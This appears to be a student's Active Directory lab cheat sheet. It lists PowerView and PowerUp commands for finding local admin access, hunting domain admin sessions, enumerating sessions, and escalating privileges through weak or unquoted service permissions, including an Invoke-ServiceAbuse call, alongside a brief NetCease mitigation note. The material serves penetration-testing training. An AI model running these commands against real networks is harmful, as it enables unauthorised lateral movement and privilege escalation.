# User Hunting

## Find Local Admin Privileges

### Find All Machines on the Current Domain Where the Current User Has Local Admin Access
```powershell
PS C:\AD\Tools> Find-LocalAdminAccess -Verbose
PS C:\AD\Tools> Find-LocalAdminAccess
```

### Check Local Admin Access on a Specific Computer
```powershell
PS C:\AD\Tools> Invoke-CheckLocalAdminAccess -ComputerName dcorp-stud157.dollarcorp.moneycorp.local
PS C:\AD\Tools> Invoke-CheckLocalAdminAccess -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
```

## WMI and PowerShell Remoting
Useful in cases where ports (RPC and SMB) used by Find-LocalAdminAccess are blocked.

### Find WMI Local Admin Access
```powershell
PS C:\AD\Tools> Find-WMILocalAdminAccess -ComputerFile .\computers.txt
```

## Find Local Admins on All Machines of the Domain
(needs administrator privileges on non-DC machines, including machines not in the domain)

### Invoke Enumerate Local Admin
```powershell
PS C:\AD\Tools> Invoke-EnumerateLocalAdmin
```

# User Hunting (List Session and Logged-on Users)

## Find Machines on a Domain Where a Domain Admin (or Specified User/Group) Has Sessions
### Find Computers Where a Domain Admin Is Logged In
```powershell
PS C:\AD\Tools> Invoke-UserHunter -Verbose
PS C:\AD\Tools> Invoke-UserHunter -CheckAccess
PS C:\AD\Tools> Invoke-UserHunter -Verbose -GroupName "rdpusers"
PS C:\AD\Tools> Invoke-UserHunter -CheckAccess
PS C:\AD\Tools> Invoke-UserHunter -Stealth
```

### Enumerate Sessions on Any Machine
```powershell
PS C:\AD\Tools> Get-NetSession -ComputerName dcorp-dc.dollarcorp.moneycorp.local
PS C:\AD\Tools> Get-NetSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
```

### Enumerate Sessions on High Traffic Servers Only
```powershell
PS C:\AD\Tools> Get-NetSession -ComputerName dcorp-stud157.dollarcorp.moneycorp.local
PS C:\AD\Tools> Get-NetSession -ComputerName dcorp-dc.dollarcorp.moneycorp.local
```
# Mitigation for Listing Current User Sessions
Using `NetCease.ps1` script can help mitigate many of the attacker's session enumeration and user hunting capabilities.
```
```
# Local and Domain Privilege Escalation

## Invoke-AllChecks Using PowerUp
```powershell
PS C:\AD\Tools> . .\PowerUp.ps1
PS C:\AD\Tools> Invoke-AllChecks
```

## Enumerate Services with Weak Service Permissions
```powershell
PS C:\AD\Tools> Get-ModifiableService
PS C:\AD\Tools> Invoke-ServiceAbuse -Name 'AbyssWebServer' -UserName 'dcorp\student157'
```

## Windows Privilege Escalation Cheat Sheet
There are various ways of locally escalating privileges on a Windows box:
- Missing patches
- Automated deployment and AutoLogon passwords in clear text
- AlwaysInstallElevated (Any user can run MSI)
- Misconfigured Services
- DLL Hijacking and more

## Get Services with Unquoted Paths and a Space in Their Name
```powershell
PS C:\AD\Tools> Get-ServiceUnquoted -Verbose
```

## Get Services Where the Current User Can Write to Its Binary Path or Change Arguments to the Binary
```powershell
PS C:\AD\Tools> Get-ModifiableServiceFile -Verbose
```

## Get the Services Whose Configuration Current User Can Modify
```powershell
PS C:\AD\Tools> Get-ModifiableService -Verbose
```

## Execute beRoot Tool
```powershell
PS C:\AD\Tools\beRoot> .\beRoot.exe
```

## Use Privesc Script to Identify Potential Privilege Escalation Vectors
```powershell
PS C:\AD\Tools\Privesc-master\Privesc-master> . .\privesc.ps1
PS C:\AD\Tools\Privesc-master\Privesc-master> Invoke-Privesc
```

